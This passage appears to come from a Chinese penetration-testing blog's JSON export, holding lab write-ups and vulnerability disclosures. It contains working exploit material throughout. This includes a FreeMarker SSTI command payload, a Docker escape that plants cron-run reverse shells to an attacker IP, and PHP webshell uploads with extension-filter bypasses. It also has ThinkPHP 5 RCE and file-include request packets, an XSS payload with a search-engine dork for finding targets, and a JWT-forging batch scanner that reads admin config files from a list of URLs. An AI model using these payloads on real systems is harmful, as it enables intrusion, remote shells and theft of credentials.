od(getDecoder).invoke(base64Clz);bytecode=clsDecoder.getMethod(decode,clsString).invoke(decoder,bytecodeBase64);catch(ee)trydatatypeConverterClz=classLoader.loadClass(javax.xml.bind.DatatypeConverter);bytecode=datatypeConverterClz.getMethod(parseBase64Binary,clsString).invoke(datatypeConverterClz,bytecodeBase64);catch(eee)clazz1=classLoader.loadClass(sun.misc.BASE64Decoder);bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);clsClassLoader=classLoader.loadClass(java.lang.ClassLoader);clsByteArray=(.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod(defineClass,[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();;#1;\\),dbSource:,type:0 http://192.168.111.22:18088/jeecg-boot/jmreport/queryFieldBySql 密码：test 请求头：User-Agent: Bhimaw loadTableData SSTI模板注入POST /jeecg-boot/jmreport/loadTableData HTTP/1.1User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13Content-Type: application/json; charset=utf-8Content-Length: 165Host: 192.168.111.22:18088Connection: keep-aliveAccept-Encoding: gzip, deflate, brdbSource:,sql:select #assign value=\\freemarker.template.utility.Execute\\?new()$value(\\whoami\\),tableName:test_demo);,pageNo:1,pageSize:10 DocToolkit 系统RCE(成功)http://192.168.111.22:18080/ 在路径/home/ubuntu/doctool.jar找到源码，下载反编译一下 /doctool.jar!/BOOT-INF/classes/com/example/doctoolkit/shiro/ShiroConfig.class 找到 shiro 密钥QZIysgMYhG7/CzIJlVpR1g== GitHub - SummerSecShiroAttack2: shiro反序列化漏洞综合利用,包含（回显执行命令注入内存马）修复原版中NoCC的问题 https://github.com/j1anFen/shiro_attack Docker 逃逸发现当前在 docker 环境中 cat /proc/1/cgroup ls -la /.dockerenv df -h 嘶 怎么个事 再看看 shiro 环境 路径：http://192.168.111.22:18080/test 密码：pass1024 发现存在挂载,挂载的是宿主机的目录 这里有个flagnItAM4shIzhenN1ubi 挂载进行定时任务逃逸 # 1. 进入宿主机tmp目录cd /dev/tmp/tmp# 2. 创建test.sh 并写入内容cat test.sh EOF#!/bin/bashbash -i /dev/tcp/192.168.111.25/7777 01sh -i /dev/tcp/192.168.111.25/7777 01/bin/sh -i /dev/tcp/192.168.111.25/7777 01/bin/bash -i /dev/tcp/192.168.111.25/7777 01/bin/bash -i /dev/tcp/192.168.111.25/7777 01EOF# 3. 赋予可执行权限chmod +x test.sh# 4. 定时任务反弹shellsed -i $a*/1 * * * * root bash /tmp/test.sh /dev/tmp/etc/crontab nc -lv 7777 第一层内网root@wty-virtual-machine:~# ip aip a1: lo: LOOPBACK,UP,LOWER_UP mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: ens160: BROADCAST,MULTICAST,UP,LOWER_UP mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b1:3a:e7 brd ff:ff:ff:ff:ff:ff altname enp3s0 inet 192.168.111.22/24 brd 192.168.111.255 scope global ens160 valid_lft forever preferred_lft forever inet6 fe80::250:56ff:feb1:3ae7/64 scope link valid_lft forever preferred_lft forever3: ens33: BROADCAST,MULTICAST,UP,LOWER_UP mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 00:50:56:b1:62:bf brd ff:ff:ff:ff:ff:ff altname enp2s1 inet 192.168.80.50/24 brd 192.168.80.255 scope global ens33 valid_lft forever preferred_lft forever inet6 fe80::250:56ff:feb1:62bf/64 scope link valid_lft forever preferred_lft forever4: br-2ed9e624a55e: BROADCAST,MULTICAST,UP,LOWER_UP mtu 1500 qdisc noqueue state UP group default link/ether 02:42:86:33:b1:e6 brd ff:ff:ff:ff:ff:ff inet 172.20.0.1/16 brd 172.20.255.255 scope global br-2ed9e624a55e valid_lft forever preferred_lft forever inet6 fe80::42:86ff:fe33:b1e6/64 scope link valid_lft forever preferred_lft forever5: br-5c4f24880ae8: NO-CARRIER,BROADCAST,MULTICAST,UP mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:90:1f:d0:a6 brd ff:ff:ff:ff:ff:ff inet 172.19.0.1/16 brd 172.19.255.255 scope global br-5c4f24880ae8 valid_lft forever preferred_lft forever6: docker0: NO-CARRIER,BROADCAST,MULTICAST,UP mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:7a:e0:9d:e5 brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever7: br-a8cbb2f18fd5: BROADCAST,MULTICAST,UP,LOWER_UP mtu 1500 qdisc noqueue state UP group default link/ether 02:42:a1:8e:71:2a brd ff:ff:ff:ff:ff:ff inet 172.18.0.1/16 brd 172.18.255.255 scope global br-a8cbb2f18fd5 valid_lft forever preferred_lft forever inet6 fe80::42:a1ff:fe8e:712a/64 scope link valid_lft forever preferred_lft forever9: vethb31e178@if8: BROADCAST,MULTICAST,UP,LOWER_UP mtu 1500 qdisc noqueue master br-2ed9e624a55e state UP group default link/ether 2a:fa:8c:44:8f:42 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet6 fe80::28fa:8cff:fe44:8f42/64 scope link valid_lft forever preferred_lft forever11: veth330c26c@if10: BROADCAST,MULTICAST,UP,LOWER_UP mtu 1500 qdisc noqueue master br-2ed9e624a55e state UP group default link/ether 7a:0a:7e:fa:82:14 brd ff:ff:ff:ff:ff:ff link-netnsid 1 inet6 fe80::780a:7eff:fefa:8214/64 scope link valid_lft forever preferred_lft forever13: vethea4b282@if12: BROADCAST,MULTICAST,UP,LOWER_UP mtu 1500 qdisc noqueue master br-2ed9e624a55e state UP group default link/ether 46:70:f8:09:e5:9b brd ff:ff:ff:ff:ff:ff link-netnsid 2 inet6 fe80::4470:f8ff:fe09:e59b/64 scope link valid_lft forever preferred_lft forever15: veth6409444@if14: BROADCAST,MULTICAST,UP,LOWER_UP mtu 1500 qdisc noqueue master br-a8cbb2f18fd5 state UP group default link/ether ea:0d:25:9a:29:33 brd ff:ff:ff:ff:ff:ff link-netnsid 3 inet6 fe80::e80d:25ff:fe9a:2933/64 scope link valid_lft forever preferred_lft foreverroot@wty-virtual-machine:~# GitHub - ph4ntonnStowaway: 👻Stowaway – Multi-hop Proxy Tool for pentesters ./linux_x64_agent -c 192.168.111.25:9999 -s pass --reconnect 10 ./macos_arm64_admin -l 9999 -s pass use 0 socks 55667 123 123 任意文件上传先看看 web 资产,扫扫目录 phpmyadmin 弱口令 rootroot，但是没办法 rce url title http://192.168.80.55/web.php Index of uploads http://192.168.80.55/web.php 文件上传表单 http://192.168.80.55/phpmyadmin/index.php phpMyAdmin http://192.168.80.55/uploads/ phpinfo() http://192.168.80.55/l.php php中文网 探针 2014 http://192.168.80.55/web.php 简单的黑名单后缀名绕过 这里简单用空格绕过、点绕过、::$DATA 绕过，其余方式自行尝试 文件上传绕过总结 Content-Disposition: form-data; name=fileToUpload; filename=1.php. Content-Disposition: form-data; name=fileToUpload; filename=2.php Content-Disposition: form-data; name=fileToUpload; filename=3.php::$DATA 尝试上传木马文件 有一点点敏感函数检测 POST /up.php HTTP/1.1Host: 192.168.80.55Content-Length: 334Cache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.9Origin: http://192.168.80.55Content-Type: multipart/form-data; boundary=----WebKitFormBoundarychBkiANjERe4CNu8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://192.168.80.55/web.phpAccept-Encoding: gzip, deflate, brConnection: keep-alive------WebKitFormBoundarychBkiANjERe4CNu8Content-Disposition: form-data; name=fileToUpload; filename=shell.php.Content-Type: image/jpeg?phpassert($_REQUEST[pass]);?------WebKitFormBoundarychBkiANjERe4CNu8Content-Disposition: form-data; name=submit上传文件------WebKitFormBoundarychBkiANjERe4CNu8-- http://192.168.80.55/uploads/shell.php 密码 pass 在桌面找到第二个 C:/Users/Administrator/Desktop/flag.txt flag8ASDE242NFSDJH83KSAIB3 第二层内网","tags":["无镜靶场"],"categories":["笔记","靶场日记","无镜靶场"]},{"title":"致远 A8+ V7 XSS(CVE-2025-56451)","path":"/2025/07/14/致远 A8+ V7 XSS(CVE-2025-56451)/","content":"FOFA https://fofa.info/ body”loginFromtopValuerowList” title”致远A8+协同管理软件 V7.0SP3”” payload: http://127.0.0.1/seeyon/main.do?topValue=%3C/script%3E%3Cdetails%20open%20ontoggle=alert(1)%3E//","tags":["原创漏洞"],"categories":["笔记","原创漏洞"]},{"title":"某通用管理系统简单代审","path":"/2025/06/22/某通用管理系统简单代审/","content":"框架漏洞(Thinkphp)TP5框架漏洞原理不做赘述了 自行搜索。 瞅一眼源码 thinkphp_5.0.7 稳了，nday都会打吧(CNVD就是这么简单！但那你要问我源码哪里来的？当然是天上掉下来的) thinkphpbase.php TP5 任意文件读取 (CNVD+1)url: http://127.0.0.1/public/index.php/admin/pub/login.html?s=index/\\think\\Lang/loadfile=/etc/passwd TP5 session文件包含RCE (CNVD+1)数据包： POST /public/index.php/admin/pub/login.html/index.php?s=captcha HTTP/1.1Host: Pragma: no-cacheAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59Content-type: application/x-www-form-urlencodedCache-Control: no-cacheCookie: PHPSESSID=qyctu23kyhoawqnvt1xdhyyobContent-Length: 113_method=__constructfilter[]=think\\Session::setmethod=getget[]=?php eval($_POST[c])?server[]=1 POST /public/index.php/admin/pub/login.html/index.php?s=captcha HTTP/1.1Host: Pragma: no-cacheAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59Content-type: application/x-www-form-urlencodedCache-Control: no-cacheCookie: PHPSESSID=qyctu23kyhoawqnvt1xdhyyoqContent-Length: 113_method=__constructmethod=getfilter[]=think\\__include_fileserver[]=phpinfoget[]=/tmp/sess_qyctu23kyhoawqnvt1xdhyyobc=phpinfo(); TP5 invokefunction 命令执行(重复)数据包： GET /public/index.php/admin/pub/login.html/index.php?s=index/think\\app/invokefunctionfunction=call_user_func_arrayvars[0]=systemvars[1][]=whoami HTTP/1.1Host: Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59Cache-Control: no-cachePragma: no-cache TP5 construct 命令执行(CNVD+1)数据包： POST /public/index.php/admin/pub/login.html/index.php?s=index/index/index HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59Content-type: application/x-www-form-urlencodedCache-Control: no-cachePragma: no-cacheAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-Length: 56s=whoami_method=__constructmethod=POSTfilter[]=system TP5 信息泄露(CNVD+1)url: http://127.0.0.1/public/index.php/admin/pub/login.html?s=index/think\\config/getname=database.username 组件漏洞jQuery-File-Upload 任意文件上传(重复)翻看源码发现jQuery-File-Upload组件 CVE-2018-9207 http://127.0.0.1/public/static/admin/lib/jQuery-File-Upload/ 数据包： POST /public/static/admin/lib/jQuery-File-Upload/server/php/ HTTP/1.1Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryURbQ6ukomAO4BxJoUser-Agent: Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/132.0.0.0Safari/537.36X-Requested-With: XMLHttpRequestAccept: application/json,text/javascript,*/*;q=0.01Accept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Content-Length: 202------WebKitFormBoundaryURbQ6ukomAO4BxJoContent-Disposition: form-data;name=files[];filename=cnvd.phpContent-Type: text/php?php phpinfo(); ?------WebKitFormBoundaryURbQ6ukomAO4BxJo-- http://127.0.0.1/public/static/admin/lib/jQuery-File-Upload/server/php/files/cnvd.php 成果展示此处为语雀卡片，点击链接查看","tags":["原创漏洞"],"categories":["笔记","原创漏洞"]},{"title":"Zer0sec靶场wp","path":"/2025/03/29/Zer0sec靶场wp/","content":"SQL注入 单引号报错，经典报错注入 123’1user‘ 注出user 尝试直接xp_cmdshell命令执行 发现存在过滤，打算fuzz查看过滤哪些参数 AES 加解密抓包发现参数加密 查看js,很基础的加解密 选择字符集：使用 UTF-8 编码。 设置密钥：设置密钥为 1234567890abcdef。 设置初始化向量（IV）：设置 IV 为 0987654321fedcba（反转字符串 abcdef1234567890）。 选择加密模式：使用 CBC 模式。 选择填充方式：使用 PKCS7 填充。 选择编码方式：使用 Base64 编码。 https://github.com/outlaws-bai/Galaxy bp爆破热加载加解密 过滤参数我这里GPT直接拉了一个脚本 import requestsfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import padimport base64# 设置密钥和初始化向量key = 1234567890abcdef.encode(utf-8)iv = 0987654321fedcba.encode(utf-8)# 加密函数def encrypt(data): cipher = AES.new(key, AES.MODE_CBC, iv) padded_data = pad(data.encode(utf-8), AES.block_size) encrypted_data = cipher.encrypt(padded_data) return base64.b64encode(encrypted_data).decode(utf-8)# 读取1.txt文件内容with open(1.txt, r, encoding=utf-8) as file: usernames = file.readlines()# 代理设置proxies = http: http://127.0.0.1:8080, https: http://127.0.0.1:8080# 遍历每个用户名for username in usernames: username = username.strip() # 去除换行符和空格 if not username: # 跳过空行 continue # 加密用户名 encrypted_username = encrypt(username) # 构造请求数据 data = username: encrypted_username, password: encrypted_username # 发送POST请求 try: response = requests.post(http://113.45.189.205:8085/login.php, data=data, proxies=proxies) print(f用户名: username, 响应状态码: response.status_code) # 检查响应内容 if 用户名包含非法字符 in response.text: with open(过滤.txt, a, encoding=utf-8) as file: file.write(username + ) print(f用户名 username 包含非法字符，已写入过滤.txt) except Exception as e: print(f请求失败，用户名: username, 错误: e)print(处理完成) 过滤参数： orandlikeintoselectunionordercursorforforeign--#;=/**/ 1‘1@@version‘ 1’1db_name()‘ 拿到数据库 lab_db 123’1user‘ 注出user dbo 获取列名注了半天本菜狗实在不能直接注出username和password 琢磨了一个有点邪教的方式（结果他跟我说靶场写错了，不小心禁用了OR ） 首先考虑这里是登录点，无非就是去数据库对应的表对比账户密码的值，这里用户名存在注入，说明直接将参数拼接在查询语句了。 模拟一下 select * from 用户表 where username ’用户名’’’ AND password ’密码’ 那就直接拼接让usernameusername，那么只要密码正确即登录成功。 不存在的列名也会通过报错出现提示 如：’+use123+’ 这里可以猜测爆破用户名的列 我就不写过程了 用户名的列为username 获取密码+username+ 这里直接爆破密码，密码正确即登录成功，有几个密码就有几个用户名 获取用户名这里拿到两个密码，逆推用户名 回到这里，两种方式，一种直接爆破用户名，一种报错注出用户名，毕竟是SQL注入靶场，用报错来。 select * from 用户表 where username ’用户名’ AND password ’密码’ +username/1+ 这里与获取密码的原理一样，给了正确的密码，数据库去寻找对应密码的账户去除1，字符串不能运算，报错出用户名 testAa123456 密码为1的用户名使用+username/1+却直接登录成功了 说明密码为1的用户名是一个数值，想制造报错就修改类型 ‘+(username+’qwer’)1+’用户名为1 文件上传利用NTFS流::$DATA绕过在Windows中如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名 例如：phpinfo.php::$DATAWindows会自动去掉末尾的::$DATA变成phpinfo.php 注：这是NTFS文件系统具有的特性，FAT32文件系统无法利用 http://113.45.189.205:8085/uploads/076w.php 上传.user.ini文件绕过 http://113.45.189.205:8085/uploads/index.php 文件包含头像上传处先上传一个php马的png http://113.45.189.205:8085/include.php?page=about.php 简单构造 http://113.45.189.205:8085/include.php?page=../uploads/076w.png 提权上马有个360哦，自己想办法搞个免杀马吧，我就不提供了 读取mssql账号密码登录 查看版本 就用mssql bypass 360那篇文章就好了，我就直接展示了","tags":["靶场日记"],"categories":["笔记","靶场日记"]},{"title":"U验证任意文件读取(CVE-2024-26559)","path":"/2024/02/23/U验证任意文件读取(CVE-2024-26559)/","content":"中文：U验证网络用户管理系统存在任意文件读取漏洞 搜索引擎: body”U用户验证系统1.0” 官网: https://user.uverif.com/ Github: https://github.com/51154393/uverif Gitee: https://gitee.com/dagg/uverif 后台任意文件读取当前最新测试版本为v2.0.4-beta，正式发布版本为v2.0，均存在此类漏洞 其漏洞点在于登录后台后生成卡密导出的下载处 http://127.0.0.1/admin/download?path=./app/data/kami/202401210556174.txt 修改路径即可构造任意文件读取, “.“代表当前目录,可读取数据库配置文件,当前管理员账户密码等 http://127.0.0.1/admin/download?path=./config/admin.php http://127.0.0.1/admin/download?path=./config/config.php 查看源码 https://github.com/51154393/uverif/blob/main/Ue/tools/download.php 这是一个PHP命名空间为Ue\\tools的类download的代码。该类提供了一个静态方法download，用于下载文件。 方法接受两个参数：$filename表示要下载的文件路径，$downLoadName表示下载时保存的文件名（可选，默认为原始文件名）。 该方法的主要逻辑如下： 首先检查$downLoadName是否为空，如果为空则将其设为$filename。 检查$filename中是否包含.，如果不包含则返回false，表示无法确定文件类型。 设置响应的MIME类型为applicationoctet-stream，表示通用的二进制文件类型。 使用fopen函数以只读方式打开文件，并通过fread函数读取文件的内容。 关闭文件句柄。 判断客户端的HTTP_USER_AGENT中是否包含”MSIE”，如果是，则设置一系列响应头信息，包括Content-Type、Content-Disposition等，以支持在IE浏览器中下载文件。 如果不是IE浏览器，则设置另一组响应头信息。 最后使用exit函数输出文件内容，并结束脚本的执行。 当前搭建环境为Windows系统且检查$filename中是否包含”.”,所以尝试读取win.ini文件 C:\\Windows\\win.ini 尝试读取hosts文件,检查“.”所以在hosts文件后加“.” 原理是Windows系统默认删除文件后缀的“.”和空格。若网站后端过滤时没有过滤末尾的点，便可进行绕过。 C:\\Windows\\System32\\drivers\\etc\\hosts. 尝试读取linux系统下文件 etcresolv.conf 前台任意文件读取尝试扩大危害,将漏洞升级 观察 Cookie 字段中 admcookies 为 jwt 加密,尝试解密 查看源码分析构造 https://github.com/51154393/uverif/blob/main/Ue/tools/Jwt.php JWT（JSON Web Token）是一种用于身份验证和授权的开放标准。它由三部分组成：头部（header）、载荷（payload）和签名（signature）。 在给定的代码中，JWT的参数生成如下： 头部（header）：使用算法HS256（HMAC SHA-256）生成签名，在代码中表示为’alg’ ‘HS256’。 载荷（payload）：包含了一些声明信息，可根据需要自定义。在代码中，载荷包含以下字段： iss：表示该JWT的签发者。 iat：表示签发时间，使用time()函数获取当前时间。 exp：表示过期时间，当前时间加上24小时。 nbf：该时间之前不接收处理该Token。 sub：表示面向的用户，默认为当前请求的域名。 jti：表示该Token的唯一标识，使用md5(uniqid(‘JWT’) . time())生成。 claim：表示自定义数据，可根据需要设置。 签名（signature）：使用密钥（key）对头部和载荷进行签名生成。签名算法使用HS256，通过调用self::signature()方法实现。 最终，通过将base64编码后的头部、载荷和签名拼接在一起，并用”.”分隔，形成JWT Token。 用python生成Cookie import hashlibimport timeimport jwtimport reimport requestsone_day = 24 * 60 * 60 # 一天的秒数# 生成头部header = alg: HS256, typ: JWT# 使用密钥进行签名secret = your-256-bit-secreturl = input(请输入URL(如 http://127.0.0.1:888/): ) # 接收用户输入的URLtry: response = requests.post(url + admin.php, verify=False, timeout=10, allow_redirects=False) if response.status_code == 302: session_id = response.cookies.get(PHPSESSID) else: print(f获取url响应失败)except requests.exceptions.Timeout: print(furl 请求超时)except requests.exceptions.RequestException as e: print(f无法连接到url: e)unique_id = hashlib.md5(str(time.time()).encode(utf-8)).hexdigest()sub = re.sub(r^https?://, , url) # 去除协议部分sub = re.sub(r/$, , sub) # 去除末尾斜杠print(sub)# 生成载荷payload = iss: admin, iat: int(time.time()), exp: int(time.time()) + one_day, # 过期时间为当前时间后一天 nbf: int(time.time()), # 生效时间为当前时间 sub: sub, jti: unique_id, claim: Nonetoken = jwt.encode(payload, secret, algorithm=HS256, headers=header)print(Cookie: + fPHPSESSID=session_id; admcookies=token; appid=1000) 抓取登陆数据包，替换生成的Cookie并发包 http://127.0.0.1/admin.php 访问漏洞url，并替换Cookie发包即可 http://127.0.0.1/admin/download?path=./config/config.php 批量检测POC:url.txt存放检测的url,源码直接运行,无需修改 import requestsimport jwtimport hashlibimport reimport timeone_day = 24 * 60 * 60 # 一天的秒数# 生成头部header = alg: HS256, typ: JWT# 使用密钥进行签名secret = your-256-bit-secretvulnerable_urls = []with open(url.txt) as file: for url in file: url = url.strip() try: response = requests.post(url + /admin.php, verify=False, timeout=10, allow_redirects=False) if response.status_code == 302: session_id = response.cookies.get(PHPSESSID) else: print(f获取url响应失败) except requests.exceptions.Timeout: print(furl 请求超时) except requests.exceptions.RequestException as e: print(f无法连接到url: e) unique_id = hashlib.md5(str(time.time()).encode(utf-8)).hexdigest() sub = re.sub(r^https?://, , url) # 去除协议部分 sub = re.sub(r/$, , sub) # 去除末尾斜杠 print(sub) # 生成载荷 payload = iss: admin, iat: int(time.time()), exp: int(time.time()) + one_day, # 过期时间为当前时间后一天 nbf: int(time.time()), # 生效时间为当前时间 sub: sub, jti: unique_id, claim: None token = jwt.encode(payload, secret, algorithm=HS256, headers=header) headers = Accept: application/json, text/javascript, */*; q=0.01, X-Requested-With: XMLHttpRequest, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36, Content-Type: application/x-www-form-urlencoded; charset=UTF-8, Cookie: fPHPSESSID=session_id; admcookies=token; appid=1000, Accept-Encoding: gzip, deflate, Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 data = user: admin, # 任意填写 password: admin # 任意填写 print(Cookie: +fPHPSESSID=session_id; admcookies=token; appid=1000) response = requests.post(furl/admin.php, headers=headers, data=data, verify=False) file = requests.get(furl/admin/download?path=./config/admin.php, headers=headers, data=data, allow_redirects=False, verify=False) if 管理员配置 in file.text: vulnerable_urls.append(url) print(file.text) with open(存在漏洞存在.txt, w) as file: for url in vulnerable_urls: file.write(url + ) English:There is an arbitrary file reading vulnerability in the U-verification network user management systemsearch engine: body”U用户验证系统1.0” Official website: https://user.uverif.com/ Github: https://github.com/51154393/uverif Gitee: https://gitee.com/dagg/uverif Read any file in the backgroundThe latest test version is v2.0.4-beta and the officially released version is v2.0, both of which have such vulnerabilities. The vulnerability lies in the download place where the card password is exported after logging in to the backend. http://127.0.0.1/admin/download?path=./app/data/kami/202401210556174.txt Modify the path to construct any file to read, “.“ represents the current directory, and can read the database configuration file, current administrator account password, etc. http://127.0.0.1/admin/download?path=./config/admin.php http://127.0.0.1/admin/download?path=./config/config.php View source code https://github.com/51154393/uverif/blob/main/Ue/tools/download.php This is a code for class download in the PHP namespace Ue\\tools. This class provides a static method download for downloading files.The method accepts two parameters: $filename represents the path of the file to be downloaded, $downLoadName represents the file name saved during downloading (optional, defaults to the original file name).The main logic of this method is as follows: First check whether $downLoadName is empty, and if it is empty, set it to $filename. Check whether $filename contains ., if not, return false, indicating that the file type cannot be determined. Set the response MIME type to applicationoctet-stream, which represents a common binary file type. Use the fopen function to open the file in read-only mode, and read the contents of the file through the fread function. Close the file handle. Determine whether the client’s HTTP_USER_AGENT contains “MSIE”. If so, set a series of response header information, including Content-Type, Content-Disposition, etc., to support downloading files in the IE browser. If it is not an IE browser, set another set of response header information. Finally, use the exit function to output the file content and end the execution of the script. The current build environment is a Windows system and check whether $filename contains “.”, so try to read the win.ini file C:\\Windows\\win.ini Try to read the hosts file and check “.” so add “.” after the hosts file. The principle is that the Windows system deletes the “.” and spaces in the file suffix by default. If the back-end filtering of the website does not include the dot at the end of the filter, it can be bypassed. C:\\Windows\\System32\\drivers\\etc\\hosts. Try to read files under linux system etcresolv.conf Read any file in the foregroundTry to expand the harm and upgrade the vulnerability Observe that admcookies in the Cookie field is encrypted by jwt and try to decrypt it. View source code analysis structure https://github.com/51154393/uverif/blob/main/Ue/tools/Jwt.php JWT (JSON Web Token) is an open standard for authentication and authorization. It consists of three parts: header, payload and signature. In the given code, the parameters of the JWT are generated as follows: Header: Use algorithm HS256 (HMAC SHA-256) to generate a signature, represented in the code as ‘alg’ ‘HS256’. Payload: Contains some declaration information and can be customized as needed. In the code, the payload contains the following fields: iat: indicates the issuance time, use the time() function to obtain the current time. iss: Indicates the issuer of the JWT. exp: indicates the expiration time, the current time plus 24 hours. nbf: The Token will not be processed before this time. sub: indicates the user targeted, defaulting to the currently requested domain name. jti: represents the unique identifier of the Token, generated using md5(uniqid(‘JWT’) . time()). claim: represents custom data, which can be set as needed. Signature: Use the key to generate signatures for the header and payload. The signature algorithm uses HS256 and is implemented by calling the self::signature() method. Finally, the JWT Token is formed by splicing the base64-encoded header, payload and signature together and separating them with “.”. Generate cookies using python import hashlibimport timeimport jwtimport reimport requestsone_day = 24 * 60 * 60 # 一天的秒数# 生成头部header = alg: HS256, typ: JWT# 使用密钥进行签名secret = your-256-bit-secreturl = input(请输入URL(如 http://127.0.0.1:888/): ) # 接收用户输入的URLtry: response = requests.post(url + admin.php, verify=False, timeout=10, allow_redirects=False) if response.status_code == 302: session_id = response.cookies.get(PHPSESSID) else: print(f获取url响应失败)except requests.exceptions.Timeout: print(furl 请求超时)except requests.exceptions.RequestException as e: print(f无法连接到url: e)unique_id = hashlib.md5(str(time.time()).encode(utf-8)).hexdigest()sub = re.sub(r^https?://, , url) # 去除协议部分sub = re.sub(r/$, , sub) # 去除末尾斜杠print(sub)# 生成载荷payload = iss: admin, iat: int(time.time()), exp: int(time.time()) + one_day, # 过期时间为当前时间后一天 nbf: int(time.time()), # 生效时间为当前时间 sub: sub, jti: unique_id, claim: Nonetoken = jwt.encode(payload, secret, algorithm=HS256, headers=header)print(Cookie: + fPHPSESSID=session_id; admcookies=token; appid=1000) Capture the login data packet and replace the generated Cookie concurrent packet http://127.0.0.1/admin.php Visit the vulnerability URL and replace the cookie to send the package. http://127.0.0.1/admin/download?path=./config/config.php Batch testing POC:Try to write a python script to construct jwt and write a poc url.txt stores the detected URL, and the source code can be run directly without modification. import requestsimport jwtimport hashlibimport reimport timeone_day = 24 * 60 * 60 # 一天的秒数# 生成头部header = alg: HS256, typ: JWT# 使用密钥进行签名secret = your-256-bit-secretvulnerable_urls = []with open(url.txt) as file: for url in file: url = url.strip() try: response = requests.post(url + /admin.php, verify=False, timeout=10, allow_redirects=False) if response.status_code == 302: session_id = response.cookies.get(PHPSESSID) else: print(f获取url响应失败) except requests.exceptions.Timeout: print(furl 请求超时) except requests.exceptions.RequestException as e: print(f无法连接到url: e) unique_id = hashlib.md5(str(time.time()).encode(utf-8)).hexdigest() sub = re.sub(r^https?://, , url) # 去除协议部分 sub = re.sub(r/$, , sub) # 去除末尾斜杠 print(sub) # 生成载荷 payload = iss: admin, iat: int(time.time()), exp: int(time.time()) + one_day, # 过期时间为当前时间后一天 nbf: int(time.time()), # 生效时间为当前时间 sub: sub, jti: unique_id, claim: None token = jwt.encode(payload, secret, algorithm=HS256, headers=header) headers = Accept: application/json, text/javascript, */*; q=0.01, X-Requested-With: XMLHttpRequest, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36, Content-Type: application/x-www-form-urlencoded; charset=UTF-8, Cookie: fPHPSESSID=session_id; admcookies=token; appid=1000, Accept-Encoding: gzip, deflate, Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 data = user: admin, # 任意填写 password: admin # 任意填写 print(Cookie: +fPHPSESSID=session_id; admcookies=token; appid=1000) response = requests.post(furl/admin.php, headers=headers, data=data, verify=False) file = requests.get(furl/admin/download?path=./config/admin.php, headers=headers, data=data, allow_redirects=False, verify=False) if 管理员配置 in file.text: vulnerable_urls.append(url) print(file.text) with open(存在漏洞存在.txt, w) as file: for url in vulnerable_urls: file.write(url + )","tags":["原创漏洞"],"categories":["笔记","原创漏洞"]},{"title":"Clicker_Medium","path":"/2023/11/01/Clicker_Medium/","content":"Clicker_Medium碎碎念：这个靶场一会清一下数据，烦死了！！！ 信息收集namp：--min-rate 10000 10000速率来扫描-p- 全端口-p80,135 指定80，135端口扫描-sU 指定udp扫描-sT 指定tcp协议-sV 扫描服务版本-sC 默认脚本扫描-O 对操作系统和版本探测--script=vuln 进行基础漏洞扫描nmap -p- --min-rate 10000 10.129.47.107nmap -p- -sU --min-rate 10000 10.129.47.107nmap -p22,80,111,2049,34327,39809,45161,53053,60989 --script=vuln 10.129.47.107nmap -p22,80,111,2049,34327,39809,45161,53053,60989 -sV -sC -sT -O 10.129.47.107 22TCP端口上的SSH服务版本号为OpenSSH 8.9p1 80TCP端口上HTTP服务版本是Apache httpd 2.4.52 2049TCP端口则是运行NFS（Network File System）服务 此外，这个主机还过滤了111TCP端口，也就是RPCbind端口，这可能表示该主机已经启用了防火墙且限制了对RPC服务的访问。 